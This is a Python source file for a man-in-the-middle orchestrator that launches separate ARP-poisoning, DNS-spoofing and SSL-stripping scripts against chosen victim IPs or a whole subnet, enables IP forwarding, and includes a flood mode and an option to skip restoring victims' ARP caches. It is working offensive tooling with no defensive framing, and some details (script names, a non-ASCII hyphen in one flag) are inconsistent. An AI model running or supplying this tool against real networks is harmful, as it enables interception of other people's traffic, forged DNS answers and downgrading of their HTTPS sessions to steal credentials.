#!/usr/bin/env python3
"""MITM‑Toolbox – single orchestrator for ARP, DNS and SSL‑strip
================================================================
This wrapper launches the three stand‑alone tools that you already
wrote (*arp_poisoner_fully_fledged.py*, *dns_spoofer_fully_fledged.py*,
*sslstrip.py*) and keeps them under one roof, so the user can run a
single command such as:

    sudo python3 mitm_toolbox.py \
        -i eth0 \
        --victims 10.0.0.42,10.0.0.43 \
        --gateway 10.0.0.1 \
        --dns-map spoof.yaml \
        --sslstrip

Features
--------
* Automatic default‑gateway discovery if *--gateway* is omitted.
* Optional auto‑enable of Linux IP‑forwarding (`--auto-forward`).
* Graceful Ctrl‑C handling – forwards the signal to children and, for
  the ARP tool, waits until caches are restored.
* Child stderr/stdout are inherited so each component still shows its
  own logs.
"""
from __future__ import annotations

import argparse
import os
import signal
import subprocess
import sys
import textwrap
from pathlib import Path
from typing import List

from scapy.all import conf

# ----------------------------------------------------------------------------
SCRIPT_NAMES = {
    "arp":  "arp.py",
    "dns":  "dns.py",
    "ssl":  "sslstrip.py",
}

# ----------------------------------------------------------------------------
class Child:
    """Small helper to keep track of *one* child process."""

    def __init__(self, argv: List[str]):
        # Run in a new process‑group so we can signal the whole child tree
        self.proc = subprocess.Popen(
            argv,
            preexec_fn=os.setsid,
        )

    def stop(self):
        # Send SIGINT to the *group* (negative pid) so inner threads get it
        try:
            os.killpg(self.proc.pid, signal.SIGINT)
        except ProcessLookupError:
            return

    def wait(self):
        try:
            self.proc.wait()
        except KeyboardInterrupt:
            pass

# ----------------------------------------------------------------------------

def discover_gateway() -> str | None:
    """Return default gateway IP as a string, or *None* if unknown."""
    try:
        route = conf.route.route("0.0.0.0")
        if route and len(route) >= 3:
            return route[2]
    except Exception:
        pass
    return None


def ensure_ip_forward(auto: bool):
    path = Path("/proc/sys/net/ipv4/ip_forward")
    if not path.exists():
        return              # non‑Linux or IPv6‑only – ignore
    current = path.read_text().strip()
    if current == "1":
        return

    if not auto:
        print("[!] IP forwarding is disabled; pass --auto-forward to enable automatically.")
        return

    try:
        path.write_text("1\n")
        print("[*] Enabled net.ipv4.ip_forward = 1 (auto).")
    except PermissionError:
        print("[!] Could not enable IP forwarding – need root? Abort.")
        sys.exit(1)

# ----------------------------------------------------------------------------

def build_arp_cmd(args, gw_ip: str | None) -> List[str] | None:
    if not (args.victims or args.cidr):
        return None  # ARP module not requested

    cmd = [sys.executable, SCRIPT_NAMES["arp"], "--iface", args.iface]

    # mode‑specific flags
    cmd += ["--mode", args.arp_mode]
    if args.interval:
        cmd += ["--interval", str(args.interval)]
    if args.no_restore:
        cmd += ["--no‑restore"]

    if args.arp_mode in ("pair", "silent"):
        if args.victims:
            cmd += ["--victims", args.victims]
        # use discovered gateway if caller omitted it
        gw = args.gateway or gw_ip
        if not gw:
            print("[!] --gateway missing and auto‑detection failed; ARP pair mode disabled.")
            return None
        cmd += ["--gateway", gw]
    elif args.arp_mode == "flood":
        if args.cidr:
            cmd += ["--cidr", args.cidr]
        gw = args.gateway or gw_ip
        if gw:
            cmd += ["--gateway", gw]
        else:
            print("[!] No gateway given – forged replies will use 0.0.0.0.")
    return cmd


def build_dns_cmd(args) -> List[str] | None:
    if not args.dns_map:
        return None
    cmd = [sys.executable, SCRIPT_NAMES["dns"], "--iface", args.iface, "--map", args.dns_map]
    if args.dns_relay:
        cmd.append("--relay")
    if args.dns_upstream:
        cmd += ["--upstream", args.dns_upstream]
    if args.dns_ttl:
        cmd += ["--ttl", str(args.dns_ttl)]
    if args.dns_bpf:
        cmd += ["--bpf", args.dns_bpf]
    if args.verbose:
        cmd.append("--verbose")
    elif args.quiet:
        cmd.append("--quiet")
    return cmd


def build_ssl_cmd(args) -> List[str] | None:
    if not args.sslstrip:
        return None
    return [sys.executable, SCRIPT_NAMES["ssl"], "--iface", args.iface]

# ----------------------------------------------------------------------------

def parse_cli():
    ep = textwrap.dedent(
        """Examples:
        sudo python3 mitm_toolbox.py -i eth0 --victims 10.0.0.42 --gateway 10.0.0.1 \
            --dns-map spoof.yaml --sslstrip
        sudo python3 mitm_toolbox.py -i wlan0 --arp-mode flood --cidr 192.168.1.0/24
        """
    )

    p = argparse.ArgumentParser(
        description="Single orchestrator for ARP, DNS, SSL‑strip tools (Scapy)",
        epilog=ep,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    p.add_argument("-i", "--iface", required=True, help="Interface to bind / sniff")

    # ARP section
    p.add_argument("--victims", help="Comma‑separated victim IPs (ARP pair/silent)")
    p.add_argument("--gateway", help="Gateway IP (pair/silent/flood modes)")
    p.add_argument("--cidr", help="CIDR for flood mode, e.g. 10.0.0.0/24")
    p.add_argument("--arp-mode", choices=["pair", "silent", "flood"], default="pair")
    p.add_argument("--interval", type=float, default=10.0, help="ARP burst interval (s)")
    p.add_argument("--no-restore", action="store_true", help="Skip ARP cache restore on exit")

    # DNS section
    p.add_argument("--dns-map", help="YAML mapping file – enable DNS spoofer")
    p.add_argument("--dns-relay", action="store_true", help="Relay unmatched queries upstream")
    p.add_argument("--dns-upstream", default="8.8.8.8", help="Upstream DNS server")
    p.add_argument("--dns-ttl", type=int, default=300, help="TTL for forged answers")
    p.add_argument("--dns-bpf", help="Extra BPF filter for DNS module")

    # SSL‑strip toggle
    p.add_argument("--sslstrip", action="store_true", help="Enable SSL‑stripper on port 80")

    # Misc
    p.add_argument("--auto-forward", action="store_true", help="Try to enable net.ipv4.ip_forward automatically")
    p.add_argument("-v", "--verbose", action="store_true", help="Verbose DNS logs (passed through)")
    p.add_argument("-q", "--quiet", action="store_true", help="Quiet DNS logs (errors only)")

    args = p.parse_args()
    return args

# ----------------------------------------------------------------------------

def main():
    args = parse_cli()

    if os.geteuid() != 0:
        print("[!] You must run as root (raw sockets required). Abort.")
        sys.exit(1)

    gw_ip = discover_gateway()
    ensure_ip_forward(args.auto_forward)

    children: List[Child] = []

    # Build and launch subs
    for builder in (lambda: build_arp_cmd(args, gw_ip),
                    lambda: build_dns_cmd(args),
                    lambda: build_ssl_cmd(args)):
        cmd = builder()
        if cmd:
            print("[*] Launching:", " ".join(cmd))
            child = Child(cmd)
            children.append(child)

    if not children:
        print("[!] Nothing to do – enable at least one of ARP / DNS / SSLstrip.")
        sys.exit(1)

    # Handle Ctrl‑C: propagate then wait
    def _sigint(_sig, _frm):
        print("\n[!] Ctrl‑C received – shutting down children …")
        for c in children:
            c.stop()
    signal.signal(signal.SIGINT, _sigint)

    # Wait for all children to exit
    for c in children:
        c.wait()

    print("[*] All children exited – goodbye.")


if __name__ == "__main__":
    main()
